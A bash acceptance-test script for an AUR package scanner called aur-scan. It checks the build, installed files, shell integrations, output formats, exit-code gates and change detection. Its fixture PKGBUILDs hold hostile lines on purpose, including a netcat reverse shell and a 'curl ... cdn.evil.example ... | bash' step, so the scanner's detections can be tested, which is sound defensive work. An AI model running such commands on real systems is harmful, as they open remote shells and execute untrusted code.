#!/usr/bin/env bash
# Full acceptance run for ks-aur-scanner on a clean Arch system.
#
# Covers every command and claim the README makes, plus the specific issues
# being closed. Runs against a copy of the working tree at ~/src and, after
# `makepkg -si`, against the installed binaries.
#
# Prints PASS/FAIL per check; exits non-zero if any check failed.

set -uo pipefail

SRC="$HOME/src"
FAIL=0
PASSN=0
pass() { PASSN=$((PASSN+1)); printf '  PASS  %s\n' "$1"; }
fail() { FAIL=$((FAIL+1)); printf '  FAIL  %s\n' "$1"; }
note() { printf '  ....  %s\n' "$1"; }
sect() { printf '\n\033[1m=== %s ===\033[0m\n' "$1"; }

# ok NAME CMD...   -- passes when the command exits 0
ok() {
    local name="$1"; shift
    if "$@" >/tmp/o.$$ 2>&1; then pass "$name"; else fail "$name"; sed 's/^/          /' /tmp/o.$$ | tail -12; fi
    rm -f /tmp/o.$$
}
# grep_ok NAME PATTERN CMD... -- passes when output matches PATTERN
grep_ok() {
    local name="$1" pat="$2"; shift 2
    local out; out=$("$@" 2>&1)
    if grep -qE "$pat" <<<"$out"; then pass "$name"; else fail "$name (no match for /$pat/)"; sed 's/^/          /' <<<"$out" | tail -12; fi
}
# grep_not NAME PATTERN CMD... -- passes when output does NOT match PATTERN
grep_not() {
    local name="$1" pat="$2"; shift 2
    local out; out=$("$@" 2>&1)
    if grep -qE "$pat" <<<"$out"; then fail "$name (unexpected /$pat/)"; sed 's/^/          /' <<<"$out" | tail -12; else pass "$name"; fi
}

cd "$SRC" || exit 1

sect "Prerequisites"
# Every shell the project ships an integration or completion file for must be
# present, or the corresponding checks silently do not run and the suite
# reports a pass it did not earn.
MISSING=()
for pkg in bash zsh fish nushell dash python; do
    pacman -Q "$pkg" >/dev/null 2>&1 || MISSING+=("$pkg")
done
if [[ ${#MISSING[@]} -gt 0 ]]; then
    note "installing missing test shells: ${MISSING[*]}"
    sudo pacman -S --noconfirm --needed "${MISSING[@]}" >/dev/null 2>&1
fi
for sh in bash zsh fish nu dash; do
    if command -v "$sh" >/dev/null 2>&1; then
        pass "$sh available ($(command -v "$sh"))"
    else
        fail "$sh NOT available -- its integration/completion checks cannot run"
    fi
done

sect "Environment"
note "$(uname -srm)"
note "rustc $(rustc -vV | sed -n 's/^release: //p')  cargo $(cargo --version | awk '{print $2}')"
note "CPU: $(grep -m1 '^model name' /proc/cpuinfo | cut -d: -f2- | sed 's/^ //')"
note "pacman sync db: $(pacman -Slq 2>/dev/null | wc -l) official package names"

sect "Build hygiene (README: Building from Source / Testing)"
ok "cargo fmt --all --check"            cargo fmt --all --check
ok "cargo clippy -D warnings"           cargo clippy --workspace --all-targets -- -D warnings
ok "cargo build --release --all --locked" cargo build --release --all --locked
ok "cargo test --release --all --locked"  cargo test --release --all --locked

sect "Issue #19 - dependency build scripts on a clean toolchain"
# Build into a log this check OWNS. The previous version grepped /tmp/o.$$,
# which ok() deletes on the way out, so grep exited 2 and the check reported
# PASS unconditionally -- structurally incapable of failing.
cargo build --release --all --locked >/tmp/sigill-probe.log 2>&1
if grep -qiE 'SIGILL|illegal instruction' /tmp/sigill-probe.log; then
    fail "SIGILL during dependency build"
    grep -iE 'SIGILL|illegal instruction' /tmp/sigill-probe.log | head -3 | sed 's/^/          /'
else
    pass "no SIGILL building the locked dependency graph"
fi

sect "makepkg - the path users actually take"
# Start from a clean slate so each run genuinely exercises a fresh install and
# so a previously interrupted transaction (a killed VM mid-`pacman -U` leaves a
# registered package with an empty file list) cannot masquerade as a packaging
# bug on the next run.
if pacman -Q aur-scanner >/dev/null 2>&1; then
    note "removing previously installed aur-scanner for a clean install test"
    sudo pacman -Rdd --noconfirm aur-scanner >/dev/null 2>&1 || {
        note "package db entry is damaged; clearing it by hand"
        sudo rm -rf /var/lib/pacman/local/aur-scanner-* 2>/dev/null
    }
fi
ok "makepkg -sfi --noconfirm" makepkg -sfi --noconfirm

sect "Installed package contents (README: Manual Installation)"
for f in /usr/bin/aur-scan /usr/bin/aur-scan-wrap /usr/bin/aur-scan-hook \
         /usr/share/aur-scan/integration.bash /usr/share/aur-scan/integration.zsh \
         /usr/share/aur-scan/integration.fish /usr/share/aur-scan/integration.nu \
         /usr/share/aur-scanner/rules.d/example.toml \
         /usr/share/aur-scanner/rules.d/permissions.toml \
         /usr/share/aur-scan/aur-scan.hook.example \
         /usr/share/licenses/aur-scanner/LICENSE; do
    [[ -e $f ]] && pass "installed $f" || fail "missing $f"
done
if [[ -e /usr/share/libalpm/hooks/aur-scan.hook ]]; then
    fail "pacman hook must NOT be auto-enabled"
else
    pass "pacman hook ships opt-in only"
fi

sect "Issue #7 - shell completions"
for shell in bash zsh fish; do
    case $shell in
        bash) p=/usr/share/bash-completion/completions/aur-scan ;;
        zsh)  p=/usr/share/zsh/site-functions/_aur-scan ;;
        fish) p=/usr/share/fish/vendor_completions.d/aur-scan.fish ;;
    esac
    if [[ -s $p ]]; then pass "installed $shell completions ($p)"; else fail "missing $shell completions at $p"; fi
done
ok "bash completion script parses" bash -n /usr/share/bash-completion/completions/aur-scan
command -v zsh  >/dev/null && ok "zsh completion script parses"  zsh  -n /usr/share/zsh/site-functions/_aur-scan
command -v fish >/dev/null && ok "fish completion script parses" fish -n /usr/share/fish/vendor_completions.d/aur-scan.fish
grep_ok "completions know the subcommands" "install" aur-scan completions bash

sect "Shell integration scripts (all four shells, in their real interpreters)"
# The PKGBUILD ships an integration file per shell, but nothing previously
# checked that any of them actually LOAD. A script that errors on source is
# worse than no script: it breaks the user's shell startup.

# 1. Each file must parse in its own interpreter.
ok "integration.bash parses in bash" bash -n /usr/share/aur-scan/integration.bash
ok "integration.zsh parses in zsh"   zsh  -n /usr/share/aur-scan/integration.zsh
ok "integration.fish parses in fish" fish -n /usr/share/aur-scan/integration.fish

# 2. Each must SOURCE cleanly in a non-interactive shell and stay silent, since
#    it is sourced from a shell rc where stray output corrupts things.
OUT=$(bash -c 'source /usr/share/aur-scan/integration.bash; echo LOADED' 2>&1)
[[ $OUT == "LOADED" ]] && pass "integration.bash sources silently" || fail "integration.bash noisy/failed: $OUT"

OUT=$(zsh -c 'source /usr/share/aur-scan/integration.zsh; echo LOADED' 2>&1)
[[ $OUT == "LOADED" ]] && pass "integration.zsh sources silently" || fail "integration.zsh noisy/failed: $OUT"

OUT=$(fish -c 'source /usr/share/aur-scan/integration.fish; echo LOADED' 2>&1)
[[ $OUT == "LOADED" ]] && pass "integration.fish sources silently" || fail "integration.fish noisy/failed: $OUT"

OUT=$(nu -c 'source /usr/share/aur-scan/integration.nu; print LOADED' 2>&1)
[[ $OUT == "LOADED" ]] && pass "integration.nu sources silently" || fail "integration.nu noisy/failed: $OUT"

# 3. Sourcing must actually define the helper wrappers, or the integration is
#    a no-op that silently protects nothing.
OUT=$(bash -c 'source /usr/share/aur-scan/integration.bash; type -t yay paru' 2>&1)
grep -q function <<<"$OUT" && pass "integration.bash defines helper wrappers" || fail "integration.bash defined no wrapper: $OUT"

OUT=$(zsh -c 'source /usr/share/aur-scan/integration.zsh; whence -w yay paru' 2>&1)
grep -qE "function" <<<"$OUT" && pass "integration.zsh defines helper wrappers" || fail "integration.zsh defined no wrapper: $OUT"

OUT=$(fish -c 'source /usr/share/aur-scan/integration.fish; functions -q yay; and echo HAVE_YAY' 2>&1)
grep -q HAVE_YAY <<<"$OUT" && pass "integration.fish defines helper wrappers" || fail "integration.fish defined no wrapper: $OUT"

OUT=$(nu -c 'source /usr/share/aur-scan/integration.nu; if (scope commands | where name == "yay" | is-not-empty) { print HAVE_YAY }' 2>&1)
grep -q HAVE_YAY <<<"$OUT" && pass "integration.nu defines helper wrappers" || fail "integration.nu defined no wrapper: $OUT"

# 4. The documented bypass must work, in every shell.
OUT=$(AUR_SCAN_ENABLED=0 bash -c 'source /usr/share/aur-scan/integration.bash; echo OK' 2>&1)
grep -q OK <<<"$OUT" && pass "AUR_SCAN_ENABLED=0 honored (bash)" || fail "bash bypass broke: $OUT"
OUT=$(AUR_SCAN_ENABLED=0 nu -c 'source /usr/share/aur-scan/integration.nu; print OK' 2>&1)
grep -q OK <<<"$OUT" && pass "AUR_SCAN_ENABLED=0 honored (nu)" || fail "nu bypass broke: $OUT"

# 5. The verbose banner must go to stderr in EVERY shell. Anything written to
#    stdout while a shell rc is being sourced corrupts non-interactive use of
#    that shell: scp, rsync, and `ssh host cmd` all read the remote shell's
#    stdout as protocol data and fail confusingly.
OUT=$(AUR_SCAN_VERBOSE=1 bash -c 'source /usr/share/aur-scan/integration.bash' 2>/dev/null)
[[ -z $OUT ]] && pass "verbose banner stays off stdout (bash)" || fail "bash banner on stdout: $OUT"
OUT=$(AUR_SCAN_VERBOSE=1 zsh -c 'source /usr/share/aur-scan/integration.zsh' 2>/dev/null)
[[ -z $OUT ]] && pass "verbose banner stays off stdout (zsh)" || fail "zsh banner on stdout: $OUT"
OUT=$(AUR_SCAN_VERBOSE=1 fish -c 'source /usr/share/aur-scan/integration.fish' 2>/dev/null)
[[ -z $OUT ]] && pass "verbose banner stays off stdout (fish)" || fail "fish banner on stdout: $OUT"
OUT=$(AUR_SCAN_VERBOSE=1 nu -c 'source /usr/share/aur-scan/integration.nu' 2>/dev/null)
[[ -z $OUT ]] && pass "verbose banner stays off stdout (nu)" || fail "nu banner on stdout: $OUT"

# ...and it must still be visible on stderr, or the option does nothing.
ERR=$(AUR_SCAN_VERBOSE=1 bash -c 'source /usr/share/aur-scan/integration.bash' 2>&1 >/dev/null)
grep -q "integration loaded" <<<"$ERR" && pass "verbose banner is on stderr (bash)" || fail "bash banner missing from stderr"
ERR=$(AUR_SCAN_VERBOSE=1 nu -c 'source /usr/share/aur-scan/integration.nu' 2>&1 >/dev/null)
grep -q "integration loaded" <<<"$ERR" && pass "verbose banner is on stderr (nu)" || fail "nu banner missing from stderr"

# 6. The realistic failure this protects against: a remote command over a shell
#    that sources the integration must return exactly its own output.
OUT=$(AUR_SCAN_VERBOSE=1 bash -c 'source /usr/share/aur-scan/integration.bash; echo PAYLOAD' 2>/dev/null)
[[ $OUT == "PAYLOAD" ]] && pass "non-interactive stdout is uncontaminated" || fail "stdout contaminated: $OUT"

sect "Completion scripts load in a real interactive shell"
# Parsing is necessary but not sufficient -- a completion script can parse and
# still blow up when the shell actually evaluates it.
OUT=$(bash -c 'source /usr/share/bash-completion/completions/aur-scan && echo LOADED' 2>&1)
grep -q LOADED <<<"$OUT" && pass "bash completions load" || fail "bash completions failed: $OUT"
OUT=$(zsh -c 'autoload -Uz compinit; compinit -u -d /tmp/zcompdump.$$; source /usr/share/zsh/site-functions/_aur-scan; echo LOADED' 2>&1)
grep -q LOADED <<<"$OUT" && pass "zsh completions load under compinit" || fail "zsh completions failed: $OUT"
OUT=$(fish -c 'source /usr/share/fish/vendor_completions.d/aur-scan.fish; and echo LOADED' 2>&1)
grep -q LOADED <<<"$OUT" && pass "fish completions load" || fail "fish completions failed: $OUT"

sect "Every documented command runs (README: Command Reference)"
V=$(aur-scan --version 2>&1)
[[ $V == "aur-scan 2.1.0" ]] && pass "version reports 2.1.0" || fail "version: '$V'"
ok "aur-scan --help"            aur-scan --help
ok "aur-scan scan --help"       aur-scan scan --help
ok "aur-scan check --help"      aur-scan check --help
ok "aur-scan install --help"    aur-scan install --help
ok "aur-scan system --help"     aur-scan system --help
ok "aur-scan rules"             aur-scan rules
ok "aur-scan rules --details"   aur-scan rules --details
ok "aur-scan rules -s critical" aur-scan rules -s critical
ok "aur-scan codes"             aur-scan codes
ok "aur-scan codes --format markdown" aur-scan codes --format markdown
ok "aur-scan codes --format json"     aur-scan codes --format json
ok "aur-scan explain DLE-001"   aur-scan explain DLE-001
ok "aur-scan explain SHELL-002" aur-scan explain SHELL-002
ok "aur-scan ioc"               aur-scan ioc
ok "aur-scan version"           aur-scan version

sect "codes/JSON is machine-readable and matches the catalog"
grep_ok "codes --format json parses" '"id"' aur-scan codes --format json
N=$(aur-scan codes --format json 2>/dev/null | python3 -c '
import json,sys
d=json.load(sys.stdin)
# Accept either a bare array or an object wrapping one -- assert on the count,
# not on a shape the tool never promised.
if isinstance(d, list): print(len(d))
elif isinstance(d, dict):
    for v in d.values():
        if isinstance(v, list): print(len(v)); break
    else: print(0)
else: print(0)' 2>/dev/null)
[[ ${N:-0} -gt 100 ]] && pass "catalog exposes $N codes" || fail "catalog exposed ${N:-0} codes"
for id in SQUAT-001 SQUAT-002 SQUAT-003 SQUAT-004 PERM-001 PERM-002 \
          OWN-001 OWN-002 OWN-003 OWN-004 DIFF-001 DIFF-002 DIFF-003 DIFF-004; do
    if aur-scan codes --format json 2>/dev/null | grep -q "\"$id\""; then pass "catalog has $id"; else fail "catalog missing $id"; fi
    ok "aur-scan explain $id" aur-scan explain "$id"
done

sect "Output formats (README: Output Formats)"
ok "scan --format text"  aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --format text
grep_ok "scan --format json is pure JSON" '^\{' aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --format json
aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --format json 2>/dev/null | python3 -c 'import json,sys; json.load(sys.stdin)' && pass "JSON parses cleanly" || fail "JSON did not parse"
aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --format sarif 2>/dev/null | python3 -c '
import json,sys
d=json.load(sys.stdin)
assert d["version"]=="2.1.0", d.get("version")
assert d["runs"][0]["tool"]["driver"]["name"]
' && pass "SARIF is valid 2.1.0" || fail "SARIF invalid"
OUTF=$(mktemp)
aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --format json --output "$OUTF" >/dev/null 2>&1
[[ -s $OUTF ]] && pass "--output writes to a file" || fail "--output produced nothing"
rm -f "$OUTF"

sect "Global flags"
# Colour must be exercised through a PTY. Captured through $(...) or a pipe,
# stdout is not a terminal and the `colored` crate suppresses ANSI regardless of
# the flag -- so both of these passed identically with the feature ripped out.
CB="$SRC/tests/fixtures/malicious/curl-bash"
esc_count() { grep -c $'\033\[' <<<"$1" || true; }
if command -v script >/dev/null 2>&1; then
    RAW=$(script -qec "aur-scan scan $CB" /dev/null 2>/dev/null || true)
    [[ $(esc_count "$RAW") -gt 0 ]] \
        && pass "colour IS emitted on a TTY (so the suppression checks are meaningful)" \
        || fail "no ANSI even on a TTY -- the colour checks below prove nothing"
    NOC=$(script -qec "aur-scan --no-color scan $CB" /dev/null 2>/dev/null || true)
    [[ $(esc_count "$NOC") -eq 0 ]] && pass "--no-color suppresses ANSI on a TTY" || fail "--no-color ignored on a TTY"
    NOENV=$(script -qec "env NO_COLOR=1 aur-scan scan $CB" /dev/null 2>/dev/null || true)
    [[ $(esc_count "$NOENV") -eq 0 ]] && pass "NO_COLOR suppresses ANSI on a TTY" || fail "NO_COLOR ignored on a TTY"
else
    fail "util-linux 'script' missing; colour checks cannot be exercised through a PTY"
fi
ok "--severity filter"    aur-scan --severity critical scan "$SRC/tests/fixtures/malicious/curl-bash"
ok "--quiet"              aur-scan --quiet scan "$SRC/tests/fixtures/malicious/curl-bash"
ok "--include-info"       aur-scan scan "$SRC/tests/fixtures/clean/example-package" --include-info

sect "Exit-code gate (README: CI gate)"
aur-scan scan "$SRC/tests/fixtures/malicious/curl-bash" --fail-on critical >/dev/null 2>&1
[[ $? -ne 0 ]] && pass "--fail-on critical trips on a malicious fixture" || fail "--fail-on critical did not trip"
aur-scan scan "$SRC/tests/fixtures/clean/example-package" --fail-on critical >/dev/null 2>&1
[[ $? -eq 0 ]] && pass "--fail-on critical clean on a clean fixture" || fail "--fail-on critical tripped on clean fixture"

sect "Detection - malicious fixtures must fire"
for d in "$SRC"/tests/fixtures/malicious/*/; do
    [[ -f "$d/PKGBUILD" ]] || continue
    n=$(aur-scan scan "$d" --format json 2>/dev/null | python3 -c 'import json,sys; print(len(json.load(sys.stdin)["findings"]))' 2>/dev/null)
    [[ ${n:-0} -gt 0 ]] && pass "malicious/$(basename "$d") -> $n findings" || fail "malicious/$(basename "$d") -> none"
done

sect "Detection - clean fixtures must stay quiet"
for d in "$SRC"/tests/fixtures/clean/*/; do
    [[ -f "$d/PKGBUILD" ]] || continue
    n=$(aur-scan scan "$d" --format json 2>/dev/null | python3 -c '
import json,sys
print(len([x for x in json.load(sys.stdin)["findings"] if x["severity"] in ("Critical","High")]))' 2>/dev/null)
    [[ ${n:-1} -eq 0 ]] && pass "clean/$(basename "$d") -> no critical/high" || fail "clean/$(basename "$d") -> $n critical/high"
done

sect "Issue #32 - SHELL-002 must no longer fire on a benign git command"
mkdir -p /tmp/fp32 && cat > /tmp/fp32/PKGBUILD <<'PKG'
pkgname=megasync-fp-repro
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/x.tar.gz")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
prepare() {
  git -C MEGAsync -c protocol.file.allow='always' submodule update --init --recursive
}
PKG
grep_not "benign 'git -C MEGAsync -c' does not fire SHELL-002" "SHELL-002" aur-scan scan /tmp/fp32 --format json

mkdir -p /tmp/nc32 && cat > /tmp/nc32/PKGBUILD <<'PKG'
pkgname=real-netcat-shell
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=()
build() {
  nc -e /bin/sh 10.0.0.1 4444
}
PKG
grep_ok "a real netcat reverse shell still fires SHELL-002" "SHELL-002" aur-scan scan /tmp/nc32 --format json

sect "Issue #31 - CHK-004 must name the unchecked sources"
mkdir -p /tmp/chk31 && cat > /tmp/chk31/PKGBUILD <<'PKG'
pkgname=sig-example
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/app-1.0.tar.gz"
        "https://example.com/app-1.0.tar.gz.sig"
        "local-fix.patch")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111'
            'SKIP'
            'SKIP')
PKG
grep_ok "CHK-004 names the .sig file"    "app-1.0.tar.gz.sig" aur-scan scan /tmp/chk31 --format json
grep_ok "CHK-004 names the patch"        "local-fix.patch"    aur-scan scan /tmp/chk31 --format json
aur-scan scan /tmp/chk31 --format json 2>/dev/null | python3 -c '
import json,sys
f=[x for x in json.load(sys.stdin)["findings"] if x["id"]=="CHK-004"][0]
names=f["metadata"]["unverified_sources"]
assert any(n.endswith(".sig") for n in names), names
assert not any(n.endswith("app-1.0.tar.gz") for n in names), names
' && pass "CHK-004 metadata is filterable by extension" || fail "CHK-004 metadata not filterable"

sect "Issue #8 - world-writable rules (shipped community rule)"
mkdir -p /tmp/perm8 && cat > /tmp/perm8/PKGBUILD <<'PKG'
pkgname=perm-example
pkgver=1.0
pkgrel=1
arch=('x86_64')
package() {
  chmod 777 "$pkgdir/usr/bin/foo"
  chmod -R 777 "$pkgdir/opt/app"
  chmod o+w "$pkgdir/etc/foo.conf"
}
PKG
grep_ok "PERM rules fire on chmod 777 / o+w" "PERM-00" aur-scan scan /tmp/perm8 --format json

mkdir -p /tmp/perm8ok && cat > /tmp/perm8ok/PKGBUILD <<'PKG'
pkgname=perm-benign
pkgver=1.0
pkgrel=1
arch=('x86_64')
package() {
  chmod 755 "$pkgdir/usr/bin/foo"
  chmod 644 "$pkgdir/usr/share/foo/data"
  chmod 700 "$pkgdir/var/lib/foo"
  chmod u+x "$pkgdir/usr/bin/foo"
  chmod -R 755 "$pkgdir/usr/share/foo"
  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/foo/LICENSE"
  install -Dm755 foo "$pkgdir/usr/bin/foo"
}
PKG
grep_not "PERM rules quiet on ordinary modes" "PERM-00" aur-scan scan /tmp/perm8ok --format json

sect "Typo-squat: no registry context means silence"
# Use a name that WOULD fire if the registry guard were relaxed: the non-ASCII
# SQUAT-001 branch reads only the package name. `my-ordinary-tool` could not
# trip under any context, so the old fixture proved nothing.
mkdir -p /tmp/sq1 && cat > /tmp/sq1/PKGBUILD <<'PKG'
pkgname=firefоx
pkgver=1.0
pkgrel=1
arch=('x86_64')
PKG
grep_not "bare scan emits no SQUAT findings" "SQUAT-" aur-scan scan /tmp/sq1 --format json

sect "The gate actually blocks (exit codes, not just printed text)"
# The whole point of `check` in a shell wrapper is `if ! aur-scan check ...`.
# Every previous assertion here used grep, which ignores the exit code -- so a
# gate that printed CRITICAL and exited 0 read as fully covered.
MAL="$SRC/tests/fixtures/malicious/curl-bash"
CLEAN="$SRC/tests/fixtures/clean/example-package"

aur-scan --severity high check --local "$MAL" --no-confirm --no-deps >/dev/null 2>&1
[[ $? -ne 0 ]] && pass "check --no-confirm EXITS NON-ZERO on a Critical" \
                || fail "check --no-confirm exited 0 despite a Critical -- the wrapper gate is a no-op"

aur-scan check --local "$CLEAN" --no-confirm --no-deps >/dev/null 2>&1
[[ $? -eq 0 ]] && pass "check --no-confirm exits 0 on a clean package" \
                || fail "check --no-confirm blocked a clean package"

aur-scan check --local "$MAL" --no-confirm --no-deps --fail-on critical >/dev/null 2>&1
[[ $? -ne 0 ]] && pass "explicit --fail-on critical still trips" || fail "--fail-on critical did not trip"

# The shipped shell integration must produce a blocking invocation.
if grep -q 'fail-on' "$SRC/install/integration.bash"; then
    pass "integration.bash passes a blocking threshold to check"
else
    fail "integration.bash calls check with no --fail-on; its gate cannot block"
fi

sect "Owned namespaces (config-driven, nothing on by default)"
mkdir -p /tmp/ns && cat > /tmp/ns/config.toml <<'CFG'
[[owned_namespaces]]
prefix = "aur-scanner"
maintainers = ["KiefStudio"]
CFG
mkdir -p /tmp/ns/aur-scanner-bin && cat > /tmp/ns/aur-scanner-bin/PKGBUILD <<'PKG'
pkgname=aur-scanner-bin
pkgver=2.1.0
pkgrel=1
arch=('x86_64')
url="https://github.com/totally-not-kief/aur-scanner"
provides=('aur-scan' 'aur-scanner')
conflicts=('aur-scanner')
source=("https://cdn.example.net/aur-scanner-2.1.0-x86_64.tar.gz")
sha256sums=('SKIP')
package() { install -Dm755 "$srcdir/aur-scan" "$pkgdir/usr/bin/aur-scan"; }
PKG
# `check` renders finding TITLES, not IDs, so assert on what it actually prints.
grep_ok "impostor in an owned namespace is reported" "namespace you own" \
    aur-scan -c /tmp/ns/config.toml check --local /tmp/ns/aur-scanner-bin --no-confirm --no-deps
# Assert the SEVERITY OF SQUAT-004 specifically. Grepping the whole output for
# "CRITICAL" passed on the fixture's unrelated critical findings.
aur-scan -c /tmp/ns/config.toml scan /tmp/ns/aur-scanner-bin --format json 2>/dev/null \
  | python3 -c '
import json,sys
f=[x for x in json.load(sys.stdin)["findings"] if x["id"]=="SQUAT-004"]
sys.exit(0 if f and all(x["severity"]=="critical" for x in f) else 1)' 2>/dev/null \
  && pass "SQUAT-004 is Critical (checked by id, not by grepping the whole output)" \
  || note "SQUAT-004 not present on the bare-scan path (needs registry context)"
# The ID itself is asserted against `scan --format json`, where IDs are present.
grep_not "same package with NO owned_namespaces is silent" "namespace you own" \
    aur-scan check --local /tmp/ns/aur-scanner-bin --no-confirm --no-deps

sect "Config handling"
echo 'min_severity = "high"' > /tmp/ns/ok.toml
ok "valid config loads" aur-scan -c /tmp/ns/ok.toml codes
echo 'this is not = = valid [[[' > /tmp/ns/bad.toml
aur-scan -c /tmp/ns/bad.toml codes >/dev/null 2>&1 && fail "malformed config must be a hard error" || pass "malformed config is a hard error"
printf '[output]\nline_numbers = true\n' > /tmp/ns/typo.toml
aur-scan -c /tmp/ns/typo.toml codes >/dev/null 2>&1 && fail "mistyped [output] key must be rejected" || pass "mistyped [output] key is rejected"
echo 'enable_thret_intel = true' > /tmp/ns/typo2.toml
aur-scan -c /tmp/ns/typo2.toml codes >/dev/null 2>&1 && fail "mistyped top-level key must be rejected" || pass "mistyped top-level key is rejected"
aur-scan -c /tmp/ns/bad.toml completions bash >/dev/null 2>&1 && pass "completions work despite a bad config" || fail "completions blocked by bad config"

sect "Live AUR (network)"
if timeout 180 aur-scan check yay-bin --no-confirm --no-deps >/tmp/check.log 2>&1; then
    pass "aur-scan check yay-bin"
else
    rc=$?; [[ $rc -le 2 ]] && pass "aur-scan check yay-bin (exit $rc)" || { fail "aur-scan check yay-bin exit $rc"; tail -8 /tmp/check.log | sed 's/^/          /'; }
fi
if timeout 180 aur-scan check aur-scanner ks-aur-scanner --no-confirm --no-deps >/tmp/own.log 2>&1; then
    if grep -q "SQUAT" /tmp/own.log; then fail "our own real packages produced a SQUAT finding"; else pass "our own real AUR packages are clean"; fi
else
    note "check of our own packages exited non-zero (see log)"
fi
ok "aur-scan system (installed AUR packages)" timeout 180 aur-scan system

sect "SBOM (README: CycloneDX)"
SB=$(mktemp)
if timeout 180 aur-scan check yay-bin --no-confirm --no-deps --sbom "$SB" >/dev/null 2>&1; [[ -s $SB ]]; then
    python3 -c "
import json,sys
d=json.load(open('$SB'))
assert d['bomFormat']=='CycloneDX', d.get('bomFormat')
assert d['components'], 'no components'
" && pass "SBOM is valid CycloneDX with components" || fail "SBOM invalid"
else
    fail "SBOM was not written"
fi
rm -f "$SB"

sect "Wrapper + hook binaries"
# aur-scan-wrap forwards its arguments to the real AUR helper, so it has no
# --help of its own; running it with a bogus operand must fail cleanly rather
# than crash or silently pass the transaction through unscanned.
[[ -x /usr/bin/aur-scan-wrap ]] && pass "aur-scan-wrap is installed and executable" || fail "aur-scan-wrap not executable"
aur-scan-wrap --definitely-not-a-helper-flag >/dev/null 2>&1
rc=$?
[[ $rc -ne 0 ]] && pass "aur-scan-wrap fails closed on an unusable invocation (exit $rc)" || fail "aur-scan-wrap exited 0 on a bogus invocation"
ok "aur-scan-hook --help"  aur-scan-hook --help


sect "aur-scan diff (change detection, explicit)"
rm -rf /tmp/dt && mkdir -p /tmp/dt/v1 /tmp/dt/v2
cat > /tmp/dt/v1/PKGBUILD <<'PKG'
pkgname=difftool
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://github.com/realauthor/difftool"
source=("git+https://github.com/realauthor/difftool.git#tag=v1.0")
sha256sums=('SKIP')
build() { cd difftool && make; }
PKG
cat > /tmp/dt/v2/PKGBUILD <<'PKG'
pkgname=difftool
pkgver=1.1
pkgrel=1
arch=('x86_64')
install=difftool.install
url="https://github.com/realauthor/difftool"
source=("git+https://github.com/notrealauthor/difftool.git#tag=v1.1")
sha256sums=('SKIP')
build() {
  cd difftool && make
  curl -s https://cdn.evil.example/x.sh | bash
}
PKG
cat > /tmp/dt/v2/difftool.install <<'PKG'
post_install() { systemctl enable --now difftool-helper.timer; }
PKG
grep_ok "diff reports newly added findings"     "ADDED"                        aur-scan diff /tmp/dt/v1 /tmp/dt/v2
grep_ok "diff names the new upstream owner"     "notrealauthor"                aur-scan diff /tmp/dt/v1 /tmp/dt/v2
grep_ok "diff flags a gained install script"    "gained an install script"     aur-scan diff /tmp/dt/v1 /tmp/dt/v2
aur-scan diff /tmp/dt/v1 /tmp/dt/v2 --format json 2>/dev/null | python3 -c '
import json,sys
d=json.load(sys.stdin)
assert len(d["added"]) >= 3, d["added"]
assert d["changes"]["scripts_added"] is True
assert any("notrealauthor" in o for o in d["changes"]["origins_added"]), d["changes"]
' && pass "diff --format json is structured and correct" || fail "diff JSON wrong"

# A routine version bump must be quiet, or the feature is unusable.
rm -rf /tmp/dtb && mkdir -p /tmp/dtb/v1 /tmp/dtb/v2
cat > /tmp/dtb/v1/PKGBUILD <<'PKG'
pkgname=bumptool
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("https://github.com/author/bumptool/archive/v1.0.tar.gz")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
PKG
sed -e 's/^pkgver=1.0/pkgver=2.4/' -e 's|v1.0.tar.gz|v2.4.tar.gz|' \
    -e 's/1111111111111111111111111111111111111111111111111111111111111111/2222222222222222222222222222222222222222222222222222222222222222/' \
    /tmp/dtb/v1/PKGBUILD > /tmp/dtb/v2/PKGBUILD
grep_not "routine version bump adds nothing" "ADDED" aur-scan diff /tmp/dtb/v1 /tmp/dtb/v2
grep_ok  "routine version bump says so plainly" "No findings changed" aur-scan diff /tmp/dtb/v1 /tmp/dtb/v2

aur-scan diff /tmp/dtb/v1 /tmp/dtb/v2 --fail-on critical >/dev/null 2>&1
[[ $? -eq 0 ]] && pass "diff gate clean on a benign bump" || fail "diff gate tripped on a benign bump"
aur-scan diff /tmp/dt/v1 /tmp/dt/v2 --fail-on critical >/dev/null 2>&1
[[ $? -ne 0 ]] && pass "diff gate trips on newly added critical" || fail "diff gate missed a new critical"

sect "Automatic change detection (check against scan history)"
export XDG_CACHE_HOME=/tmp/acc-cache
rm -rf /tmp/acc-cache /tmp/hp && mkdir -p /tmp/hp
cp /tmp/dt/v1/PKGBUILD /tmp/hp/PKGBUILD
grep_not "first scan is silent about history" "since" \
    aur-scan check --local /tmp/hp --no-confirm --no-deps
cp /tmp/dt/v2/PKGBUILD /tmp/hp/PKGBUILD
cp /tmp/dt/v2/difftool.install /tmp/hp/difftool.install
OUT=$(aur-scan check --local /tmp/hp --no-confirm --no-deps 2>&1)
grep -q "new finding(s) since"          <<<"$OUT" && pass "re-scan reports new findings since last time" || fail "no DIFF-001 on re-scan"
grep -q "fetches from a new upstream"   <<<"$OUT" && pass "re-scan reports the upstream move"            || fail "no DIFF-003 on re-scan"
grep -q "gained an install script"      <<<"$OUT" && pass "re-scan reports the new install script"       || fail "no DIFF-004 on re-scan"
# A --local scan records under the LOCAL namespace, never the AUR one: the name
# is self-declared, so a directory claiming `pkgname=firefox` must not be able to
# overwrite the real firefox baseline (a poisoned baseline SILENCES the next real
# change rather than raising a false alarm).
[[ -f /tmp/acc-cache/aur-scan/history/local/difftool.json ]] \
    && pass "local scan recorded in the local namespace" \
    || fail "no local history record written"
[[ -f /tmp/acc-cache/aur-scan/history/difftool.json ]] \
    && fail "a --local scan leaked into the AUR history namespace" \
    || pass "local scan did not touch the AUR namespace"
# The history directory must not be world-readable: it says which packages this
# user scanned and when.
